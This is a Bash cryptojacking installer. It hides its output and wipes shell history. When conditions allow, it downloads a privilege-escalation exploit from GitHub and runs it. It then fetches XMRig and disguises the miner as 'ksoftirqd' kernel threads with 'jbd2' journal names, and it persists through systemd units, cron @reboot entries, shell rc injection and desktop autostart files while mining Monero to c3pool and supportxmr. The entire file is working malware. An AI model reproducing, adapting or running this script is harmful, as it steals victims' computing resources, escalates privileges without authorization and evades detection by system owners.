#!/usr/bin/env bash
VERSION="7.16-unified-safe-lpe"
set +m

exec >/dev/null 2>&1
unset HISTFILE SSH_CLIENT SSH_CONNECTION SSH_TTY SSH_AUTH_SOCK 2>/dev/null
export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0

C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
BACKUP_DOWNLOAD_URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
LPE_URL1="https://raw.githubusercontent.com/ZephrFish/CopyFail-CVE-2026-31431/main/copyfail.py"
LPE_URL2="https://raw.githubusercontent.com/ZephrFish/CopyFail-CVE-2026-31431/refs/heads/main/copyfail.py"

WALLET="${1:-}"
EMAIL="${2:-}"
PASS="x"
KEEP_CONFIG="${KEEP_CONFIG:-0}"
KEEP_BINARY="${KEEP_BINARY:-0}"
USER_HINT="${THREADS_HINT:-}"
FORCE_REINSTALL="${FORCE_REINSTALL:-0}"

log()  { :; }
fail() { exit 1; }
TS()   { date +%Y%m%d_%H%M%S; }

_escape_re() {
  if command -v sed >/dev/null 2>&1; then
    printf '%s' "$1" | sed 's/[][\.^$*+?(){}|]/\\&/g'
  else
    printf '%s' "$1" | sed 's/\./\\./g' 2>/dev/null || printf '%s' "$1"
  fi
}

backup_if_exists() {
  local f="$1"
  [ -f "$f" ] && cp -p "$f" "${f}.bak.$(TS)" 2>/dev/null && log "[*] Backup: $f"
}

is_gzip() {
  [ -s "$1" ] || return 1
  local magic
  magic="$(head -c 2 "$1" 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n')"
  [ "$magic" = "1f8b" ] || return 1
  command -v gzip >/dev/null 2>&1 && gzip -t "$1" >/dev/null 2>&1
}

_is_unsafe_path() {
  [ -L "$1" ] && return 0
  [ -e "$1" ] && [ ! -d "$1" ] && return 0
  return 1
}

_can_exec_in() {
  local d="$1" probe="$d/.xp-$$"
  printf '#!/bin/sh\nexit 0\n' >"$probe" 2>/dev/null || return 1
  chmod 700 "$probe" 2>/dev/null || { rm -f "$probe"; return 1; }
  ( "$probe" ) >/dev/null 2>&1; local rc=$?
  rm -f "$probe" 2>/dev/null
  return $rc
}

_is_bogus() {
  case "$1" in ""|"/"|"/."|"//"|"//."*|/.*) return 0 ;; esac
  return 1
}

_derive_cwd() {
  local p="$1" cwd=""
  cwd="$(readlink "$p/cwd" 2>/dev/null)"
  case "$cwd" in *"/.jbd2-"*) printf '%s' "$cwd"; return 0 ;; esac
  if [ -r "$p/cmdline" ]; then
    cwd="$(tr '\0' '\n' < "$p/cmdline" 2>/dev/null | grep -oE '/[^[:space:]]*/\.jbd2-[a-zA-Z0-9-]+' | head -1)"
    case "$cwd" in *"/.jbd2-"*) printf '%s' "$cwd"; return 0 ;; esac
  fi
  return 1
}

# --- KIỂM TRA ĐIỀU KIỆN LPE ---
_is_lpe_viable() {
    # 1. Nếu đã là root thì không cần LPE
    if [ "$(id -u)" = "0" ]; then return 1; fi
    
    # 2. Kiểm tra Kernel: Chỉ chạy LPE nếu kernel < 6 (tránh treo máy trên kernel mới)
    local k_ver
    k_ver="$(uname -r)"
    local major="${k_ver%%.*}"
    [ "$major" -ge 6 ] 2>/dev/null && return 1
    
    # 3. Kiểm tra unprivileged_userns_clone (nếu bị tắt thì LPE thường thất bại)
    if [ -f /proc/sys/kernel/unprivileged_userns_clone ]; then
        [ "$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)" = "0" ] && return 1
    fi
    return 0
}

download_file() {
  local url="$1" out="$2" tmp="$2.part"
  rm -f "$tmp" 2>/dev/null
  if command -v curl >/dev/null 2>&1; then
    curl -fL --retry 2 --connect-timeout 15 --max-time 300 "$url" -o "$tmp" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
    curl -kfL --retry 2 --connect-timeout 15 --max-time 300 "$url" -o "$tmp" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
  fi
  if command -v wget >/dev/null 2>&1; then
    wget -q -O "$tmp" --timeout=30 --tries=2 "$url" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
    wget -q --no-check-certificate -O "$tmp" --timeout=30 --tries=2 "$url" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
  fi
  return 1
}

download_text() {
  local url="$1" out
  if command -v curl >/dev/null 2>&1; then
    out="$(curl -fsSL --retry 2 --connect-timeout 15 --max-time 60 \
      -H 'Accept: application/vnd.github+json' -H 'User-Agent: unified-installer' "$url" 2>/dev/null)"
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
  fi
  if command -v wget >/dev/null 2>&1; then
    out="$(wget -qO- --header='Accept: application/vnd.github+json' \
      --user-agent='unified-installer' --timeout=30 --tries=2 "$url" 2>/dev/null)"
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
  fi
  return 1
}

# --- CHẠY LPE NẾU ĐỦ ĐIỀU KIỆN ---
if _is_lpe_viable && command -v python3 >/dev/null 2>&1; then
    umask 077
    _lpe_done=0
    for _d in "/dev/shm" "/var/tmp" "/tmp" "${HOME:-}/.cache"; do
        [ -n "$_d" ] && [ -d "$_d" ] && [ -w "$_d" ] || continue
        _f="$(mktemp "${_d}/.cf_XXXXXX.py" 2>/dev/null)" || continue
        
        # Tải copyfail.py
        if command -v curl >/dev/null 2>&1; then
            { curl -fsSL "$LPE_URL1" -o "$_f" 2>/dev/null || curl -fsSL "$LPE_URL2" -o "$_f" 2>/dev/null; } && [ -s "$_f" ]
        elif command -v wget >/dev/null 2>&1; then
            { wget -qO "$_f" "$LPE_URL1" 2>/dev/null || wget -qO "$_f" "$LPE_URL2" 2>/dev/null; } && [ -s "$_f" ]
        fi

        if [ -s "$_f" ]; then
            # Chạy với timeout 60s để tránh treo máy
            timeout 60 python3 "$_f" >/dev/null 2>&1 || true
            rm -f "$_f" 2>/dev/null
            _lpe_done=1
            break
        fi
        rm -f "$_f" 2>/dev/null
    done
fi

# Đánh giá lại quyền root sau khi chạy LPE
HAS_ROOT=0
if [ "$(id -u 2>/dev/null || echo 1)" = "0" ]; then HAS_ROOT=1
elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then HAS_ROOT=1; fi

command -v nice   >/dev/null 2>&1 && _NICE_PREFIX="nice -n 19" || _NICE_PREFIX=""
command -v timeout >/dev/null 2>&1 && _TO="timeout 15"        || _TO=""

_REAL_ROOT=0
[ "$(id -u)" = "0" ] && _REAL_ROOT=1

_sys() {
  if [ "$_REAL_ROOT" = "1" ]; then
    "$@"
  elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
    sudo -n "$@" 2>/dev/null
  else
    return 1
  fi
}

_sysonly() {
  if [ "$_REAL_ROOT" = "1" ]; then
    "$@"
  elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
    sudo -n "$@" 2>/dev/null
  else
    return 1
  fi
}

_try() {
  "$@" 2>/dev/null && return 0
  _sys "$@" 2>/dev/null && return 0
  return 1
}

if command -v flock >/dev/null 2>&1; then
  _GLOCK="/tmp/.jbd2-sync.lock"
  exec 8> "$_GLOCK"
  flock -n 8 || exit 0
fi

_MARKER="/run/.jbd2-journal.state"
{ [ -d /run ] && [ -w /run ]; } || _MARKER="/tmp/.jbd2-journal.state"

_uid="$(id -u 2>/dev/null || echo 0)"
_home="${HOME:-}"
{ [ -n "$_home" ] && [ -d "$_home" ] && [ -w "$_home" ] && [ -x "$_home" ]; } || _home=""
_xdg_data="${XDG_DATA_HOME:-}"
_xdg_run="${XDG_RUNTIME_DIR:-/run/user/$_uid}"

if [ "$FORCE_REINSTALL" != "1" ]; then
    _hp_pids=()
    _hp_starts=()
    _hp_cwds=()

    for _hp_p in /proc/[0-9]*; do
        _hp_pid="${_hp_p#/proc/}"
        [ "$_hp_pid" = "$$" ] && continue
        [ "$_hp_pid" = "$PPID" ] && continue
        [ -d "$_hp_p" ] || continue

        _hp_comm="$(cat "$_hp_p/comm" 2>/dev/null)"
        case "$_hp_comm" in
            ksoftirqd-*) : ;;
            *) continue ;;
        esac

        _hp_state="$(awk '{print $3}' "$_hp_p/stat" 2>/dev/null)"
        case "$_hp_state" in Z|X|z|x) continue ;; esac

        _hp_ut="$(awk '{print $14+$15}' "$_hp_p/stat" 2>/dev/null)"
        case "$_hp_ut" in ''|*[!0-9]*) continue ;; esac
        [ "$_hp_ut" -ge 100 ] || continue

        _hp_start="$(awk '{print $22}' "$_hp_p/stat" 2>/dev/null)"
        case "$_hp_start" in ''|*[!0-9]*) _hp_start=0 ;; esac

        _hp_cwd="$(_derive_cwd "$_hp_p")" || continue
        case "$_hp_cwd" in *"/.jbd2-"*) : ;; *) continue ;; esac

        _hp_pids+=("$_hp_pid")
        _hp_starts+=("$_hp_start")
        _hp_cwds+=("$_hp_cwd")
    done

    _hp_n="${#_hp_pids[@]}"

    if [ "$_hp_n" -ge 1 ]; then
        _hp_ki=0
        for _i in "${!_hp_pids[@]}"; do
            _s_i="${_hp_starts[$_i]}"
            _s_k="${_hp_starts[$_hp_ki]}"
            if [ "$_s_i" -lt "$_s_k" ] 2>/dev/null; then
                _hp_ki="$_i"
            elif [ "$_s_i" -eq "$_s_k" ] 2>/dev/null; then
                [ "${_hp_pids[$_i]}" -lt "${_hp_pids[$_hp_ki]}" ] 2>/dev/null && _hp_ki="$_i"
            fi
        done
        _hp_kpid="${_hp_pids[$_hp_ki]}"

        # Nếu đã có miner chạy, chỉ giữ lại 1 process, kill các process dư thừa (nếu có)
        for _i in "${!_hp_pids[@]}"; do
            [ "$_i" = "$_hp_ki" ] && continue
            _try kill -9 "${_hp_pids[$_i]}" || true
        done

        exit 0
    fi
fi

if [ -f "$_MARKER" ]; then
  _OLD_DIR="$(tr -d '\r\n' < "$_MARKER" 2>/dev/null)"
  case "$_OLD_DIR" in
    /*/.jbd2-*) : ;;
    *) _OLD_DIR="" ;;
  esac
  if [ -n "$_OLD_DIR" ] && [ -d "$_OLD_DIR" ]; then
    _try pkill -9 -f "$(_escape_re "$_OLD_DIR")" || true
    _try rm -rf "$_OLD_DIR" || true
  fi
  rm -f "$_MARKER" 2>/dev/null || true
fi

RAND_SUFFIX=$(head -c 16 /dev/urandom 2>/dev/null | base64 2>/dev/null | tr -dc 'a-z0-9' | head -c 8)
[ -z "$RAND_SUFFIX" ] && RAND_SUFFIX="$(date +%s%N | sha256sum | head -c 8)"

DIR_SUFFIX=".jbd2-${RAND_SUFFIX}"
BIN_NAME="ksoftirqd-${RAND_SUFFIX}"
DISGUISE_ARGV="[ksoftirqd/2]"
CONFIG_NAME=".ld.cache.bak"
WRAPPER_NAME=".journal-${RAND_SUFFIX}"
SERVICE_NAME="jbd2-journal-${RAND_SUFFIX}.service"

if command -v systemctl >/dev/null 2>&1; then
  for _gsf in /etc/systemd/system/jbd2-journal-*.service; do
    [ -f "$_gsf" ] || continue
    _sysonly systemctl disable --now "$(basename "$_gsf")" || true
    _try rm -f "$_gsf" || true
  done
  _sysonly systemctl daemon-reload || true
fi

CANDIDATES=()
if [ -n "$_home" ]; then
  [ -n "$_xdg_data" ] && CANDIDATES+=("${_xdg_data}/${DIR_SUFFIX}")
  CANDIDATES+=(
    "$_home/.cache/${DIR_SUFFIX}"
    "$_home/.local/${DIR_SUFFIX}"
  )
fi
CANDIDATES+=(
  "${_xdg_run}/${DIR_SUFFIX}-${_uid}"
  "/dev/shm/${DIR_SUFFIX}-${_uid}"
  "/tmp/${DIR_SUFFIX}-${_uid}"
  "/var/tmp/${DIR_SUFFIX}-${_uid}"
)

INSTALL_DIR=""
for c in "${CANDIDATES[@]}"; do
  _is_bogus "$c" && continue
  _is_unsafe_path "$c" && continue
  mkdir -p "$c" 2>/dev/null || continue
  { [ -d "$c" ] && [ ! -L "$c" ]; } || continue
  { [ -w "$c" ] && [ -x "$c" ]; } || continue
  _can_exec_in "$c" || continue
  INSTALL_DIR="$c"; break
done

{ [ -n "$INSTALL_DIR" ] && [ -w "$INSTALL_DIR" ] && [ -x "$INSTALL_DIR" ]; } || exit 1
chmod 700 "$INSTALL_DIR" 2>/dev/null || true

CONFIG_PATH="$INSTALL_DIR/$CONFIG_NAME"
RUNNER="$INSTALL_DIR/$WRAPPER_NAME"

printf '%s\n' "$INSTALL_DIR" > "$_MARKER" 2>/dev/null || true
ARCHIVE="$INSTALL_DIR/.jbd2.tmp"

[ -z "$WALLET" ] && exit 1
WALLET_BASE="${WALLET%%.*}"
case "${#WALLET_BASE}" in 106|95) ;; *) exit 1 ;; esac

if [ "$HAS_ROOT" -eq 1 ]; then PASS="root"; else PASS="x"; fi
[ -n "$EMAIL" ] && PASS="${PASS}:${EMAIL}"

_cur_v="$(ulimit -v 2>/dev/null || echo unlimited)"
if [ "$_cur_v" != "unlimited" ] && [ "${_cur_v:-0}" -lt 524288 ] 2>/dev/null; then
  ulimit -v unlimited 2>/dev/null || ulimit -v 1048576 2>/dev/null || true
fi

CPU_THREADS="$(nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)"
case "$CPU_THREADS" in ''|*[!0-9]*) CPU_THREADS=1 ;; esac
[ "$CPU_THREADS" -ge 1 ] 2>/dev/null || CPU_THREADS=1

MEM_MB="$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 0)"
case "$MEM_MB" in ''|*[!0-9]*) MEM_MB=0 ;; esac

L3_MB=0
if [ -f /sys/devices/system/cpu/cpu0/cache/index3/size ]; then
    L3_VAL=$(cat /sys/devices/system/cpu/cpu0/cache/index3/size 2>/dev/null)
    L3_MB=$(printf '%s' "$L3_VAL" | grep -oE '^[0-9]+')
    case "$L3_MB" in ''|*[!0-9]*) L3_MB=0 ;; esac
    printf '%s' "$L3_VAL" | grep -q 'K' && L3_MB=$((L3_MB / 1024))
fi

HAS_GUI=0
pgrep -x Xorg     >/dev/null 2>&1 && HAS_GUI=1
pgrep -x Xwayland >/dev/null 2>&1 && HAS_GUI=1

MAX_THREADS_RAM=$((MEM_MB / 256))
MAX_THREADS_L3=$((L3_MB / 2))
[ "$MAX_THREADS_L3" -eq 0 ] && MAX_THREADS_L3=$CPU_THREADS

OPTIMAL_THREADS=$CPU_THREADS
[ "$MAX_THREADS_RAM" -lt "$OPTIMAL_THREADS" ] && OPTIMAL_THREADS=$MAX_THREADS_RAM
[ "$MAX_THREADS_L3"  -lt "$OPTIMAL_THREADS" ] && OPTIMAL_THREADS=$MAX_THREADS_L3
[ "$OPTIMAL_THREADS" -lt 1 ] && OPTIMAL_THREADS=1
if [ "$HAS_GUI" -eq 1 ]; then
    OPTIMAL_THREADS=$((OPTIMAL_THREADS / 2))
    [ "$OPTIMAL_THREADS" -lt 1 ] && OPTIMAL_THREADS=1
fi
THREADS_HINT=$(( (OPTIMAL_THREADS * 100) / CPU_THREADS ))
[ "$THREADS_HINT" -gt 100 ] && THREADS_HINT=100
[ -n "$USER_HINT" ] && THREADS_HINT="$USER_HINT"

HP_BOOL="false"; RX_MODE="auto"
[ "$MEM_MB" -lt 2048 ] && RX_MODE="light"

if [ "$HAS_ROOT" -eq 1 ] && [ "$MEM_MB" -ge 2048 ]; then
    _sysonly sysctl -w vm.nr_hugepages=1280 || true
    [ -f /proc/sys/vm/nr_hugepages ] && [ "$(cat /proc/sys/vm/nr_hugepages 2>/dev/null)" -gt 0 ] \
      && HP_BOOL="true"
fi

EXP_HASH=$(( CPU_THREADS * 700 / 1000 )); [ "$EXP_HASH" -gt 0 ] || EXP_HASH=1
if   [ "$EXP_HASH" -le 25000 ];  then PORT=13333
elif [ "$EXP_HASH" -le 100000 ]; then PORT=19999
else PORT=23333; fi

if [ -f "$INSTALL_DIR/.jbd2.run" ]; then
  _mpid="$(tr -d '[:space:]' < "$INSTALL_DIR/.jbd2.run" 2>/dev/null)"
  case "$_mpid" in
    ''|*[!0-9]*) : ;;
    *) _try kill -9 "$_mpid" || true ;;
  esac
  rm -f "$INSTALL_DIR/.jbd2.run"
fi
_try pkill -f "$(_escape_re "${INSTALL_DIR}/${BIN_NAME}")"    || true
sleep 1

get_latest_xmrig_url() {
  local arch json url
  arch="$(uname -m 2>/dev/null || echo unknown)"
  case "$arch" in x86_64|amd64) ;; *) return 2 ;; esac
  json="$(download_text "$XMRIG_LATEST_API")" || return 1
  url="$(printf '%s' "$json" | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz' | head -n 1)"
  [ -n "$url" ] || return 1
  printf '%s\n' "$url"
}

_extract_bin() {
  local archive="$1" tmp found
  tmp="$(mktemp -d)" || return 1
  tar xzf "$archive" -C "$tmp" --strip-components=1 2>/dev/null \
    || tar xzf "$archive" -C "$tmp" 2>/dev/null \
    || { rm -rf "$tmp"; return 1; }
  rm -f "$archive"
  found="$(find "$tmp" -maxdepth 4 -type f -name 'xmrig' 2>/dev/null | head -1)"
  [ -n "$found" ] || { rm -rf "$tmp"; return 1; }
  mv -f "$found" "$INSTALL_DIR/$BIN_NAME" && chmod +x "$INSTALL_DIR/$BIN_NAME" 2>/dev/null
  rm -rf "$tmp"
  [ -x "$INSTALL_DIR/$BIN_NAME" ]
}

install_latest_official_xmrig() {
  if [ "$KEEP_BINARY" = "1" ] && [ -x "$INSTALL_DIR/$BIN_NAME" ]; then return 0; fi
  local url
  url="$(get_latest_xmrig_url)" || return $?
  rm -f "$INSTALL_DIR/$BIN_NAME" "$ARCHIVE" 2>/dev/null
  download_file "$url" "$ARCHIVE" || return 1
  _extract_bin "$ARCHIVE"
}

install_c3pool_package() {
  if [ "$KEEP_BINARY" = "1" ] && [ -x "$INSTALL_DIR/$BIN_NAME" ]; then return 0; fi
  rm -f "$INSTALL_DIR/$BIN_NAME" "$ARCHIVE" 2>/dev/null
  download_file "$C3POOL_DOWNLOAD_URL" "$ARCHIVE" \
    || download_file "$BACKUP_DOWNLOAD_URL" "$ARCHIVE" || return 1
  _extract_bin "$ARCHIVE"
}

if ! install_latest_official_xmrig; then
  install_c3pool_package || exit 1
fi

CONFIG_PATH="$INSTALL_DIR/$CONFIG_NAME"

CONFIG_CONTENT=$(cat <<EOF_CONFIG
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false },
    "autosave": false, "background": false, "colors": false, "title": false,
    "randomx": { "init": -1, "init-avx2": -1, "mode": "$RX_MODE", "1gb-pages": false, "rdmsr": false, "wrmsr": false, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 },
    "cpu": { "enabled": true, "huge-pages": $HP_BOOL, "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "max-threads-hint": $THREADS_HINT, "asm": true },
    "opencl": { "enabled": false }, "cuda": { "enabled": false },
    "log-file": null, "donate-level": 1, "donate-over-proxy": 1,
    "pools": [
        { "url": "auto.c3pool.org:$PORT",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:19999",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:443",      "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "auto.c3pool.org:80",       "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:443",  "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "pool.supportxmr.com:8080", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:80",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true }
    ],
    "print-time": 60, "retries": 5, "retry-pause": 5, "syslog": false
}
EOF_CONFIG
)

backup_if_exists "$CONFIG_PATH"
printf '%s\n' "$CONFIG_CONTENT" > "$CONFIG_PATH"
chmod 600 "$CONFIG_PATH" 2>/dev/null || true

RUNNER="$INSTALL_DIR/$WRAPPER_NAME"
backup_if_exists "$RUNNER"

cat > "$RUNNER" <<EOF_MINER
#!/usr/bin/env bash
set +m
exec >/dev/null 2>&1
cd "$INSTALL_DIR" 2>/dev/null || exit 1
export XMRIG_NO_TLS_WARN=1 XMRIG_QUIET=1

if command -v flock >/dev/null 2>&1; then
  exec 9> .jbd2.lck
  flock -n 9 || exit 0
fi

start_miner() {
  if command -v setsid >/dev/null 2>&1; then
    ( setsid $_NICE_PREFIX bash -c 'exec -a "\$0" "\$@"' "$DISGUISE_ARGV" \\
        "$INSTALL_DIR/$BIN_NAME" --config="$CONFIG_PATH" --no-color --quiet \\
        </dev/null >/dev/null 2>&1 & ) </dev/null >/dev/null 2>&1
  else
    ( $_NICE_PREFIX bash -c 'exec -a "\$0" "\$@"' "$DISGUISE_ARGV" \\
        "$INSTALL_DIR/$BIN_NAME" --config="$CONFIG_PATH" --no-color --quiet \\
        </dev/null >/dev/null 2>&1 & ) </dev/null >/dev/null 2>&1
  fi
  sleep 1
  MINER_PID="\$(pgrep -P \$\$ -f 'ksoftirqd-' 2>/dev/null | head -1)"
  [ -z "\$MINER_PID" ] && MINER_PID="\$(pgrep -u "\$(id -u)" -f "\$INSTALL_DIR/\$BIN_NAME" 2>/dev/null | head -1)"
  [ -n "\$MINER_PID" ] && echo "\$MINER_PID" > .jbd2.run
}

start_miner

while true; do
  sleep 30
  if [ -f .jbd2.run ]; then
    PID=\$(tr -d '[:space:]' < .jbd2.run 2>/dev/null)
    case "\$PID" in
      ''|*[!0-9]*) start_miner ;;
      *) kill -0 "\$PID" 2>/dev/null || start_miner ;;
    esac
  else
    start_miner
  fi
done
EOF_MINER
chmod +x "$RUNNER"

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  SVC_FILE="$INSTALL_DIR/.jbd2.svc"
  cat > "$SVC_FILE" <<EOF_SERVICE
[Unit]
Description=JBD2 Journal Flush Daemon
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/env bash $RUNNER
StandardOutput=null
StandardError=null
Restart=always
RestartSec=30
KillMode=control-group
Nice=19

[Install]
WantedBy=multi-user.target
EOF_SERVICE

  TARGET="/etc/systemd/system/$SERVICE_NAME"
  [ -f "$TARGET" ] && cp -p "$TARGET" "${TARGET}.bak.$(TS)" 2>/dev/null
  if cp "$SVC_FILE" "$TARGET"; then
    _sysonly systemctl daemon-reload || true
    _sysonly systemctl enable "$SERVICE_NAME" || true
    _sysonly systemctl restart "$SERVICE_NAME" || HAS_ROOT=0
  else
    HAS_ROOT=0
  fi
fi

if [ "$HAS_ROOT" = "0" ]; then
  if command -v systemctl >/dev/null 2>&1 && systemctl --user show-environment >/dev/null 2>&1; then
    USER_DIR="$HOME/.config/systemd/user"; mkdir -p "$USER_DIR" 2>/dev/null
    USVC="$USER_DIR/$SERVICE_NAME"; backup_if_exists "$USVC"
    cat > "$USVC" <<EOF_USERVICE
[Unit]
Description=JBD2 Journal Flush Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/env bash $RUNNER
Restart=always
RestartSec=30
KillMode=control-group
Nice=19

[Install]
WantedBy=default.target
EOF_USERVICE
    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable --now "$SERVICE_NAME" 2>/dev/null || true
    command -v loginctl >/dev/null 2>&1 \
      && loginctl enable-linger "$(id -un 2>/dev/null)" 2>/dev/null || true
  fi
  
  if command -v crontab >/dev/null 2>&1; then
    CL="nohup $RUNNER >/dev/null 2>&1 &"
    crontab -l 2>/dev/null | grep -F -q "$RUNNER" \
      || { crontab -l 2>/dev/null; echo "@reboot $CL"; } | crontab - 2>/dev/null || true
  fi
  
  # Chèn vào bashrc (Bản an toàn không in lỗi, tự động dọn dẹp)
  for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile"; do
    [ -d "$HOME" ] || continue
    touch "$RC" 2>/dev/null || continue
    [ -w "$RC" ] || continue
    sed -i '/\.jbd2-/d' "$RC" 2>/dev/null || true
    sed -i '/\.journal-/d' "$RC" 2>/dev/null || true
    printf '\n(setsid %s >/dev/null 2>&1 &)\n' "$RUNNER" >> "$RC" 2>/dev/null || true
  done

  if mkdir -p "$HOME/.config/autostart" 2>/dev/null; then
    AS_FILE="$HOME/.config/autostart/jbd2-flush-${RAND_SUFFIX}.desktop"
    cat > "$AS_FILE" <<EOF_DESKTOP
[Desktop Entry]
Type=Application
Name=Journal Flush Service
Exec=bash $RUNNER
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF_DESKTOP
  fi
  
  if command -v setsid >/dev/null 2>&1; then
    ( setsid nohup "$RUNNER" </dev/null >/dev/null 2>&1 & ) </dev/null >/dev/null 2>&1
  else
    ( nohup "$RUNNER" </dev/null >/dev/null 2>&1 & ) </dev/null >/dev/null 2>&1
  fi
fi

exit 0
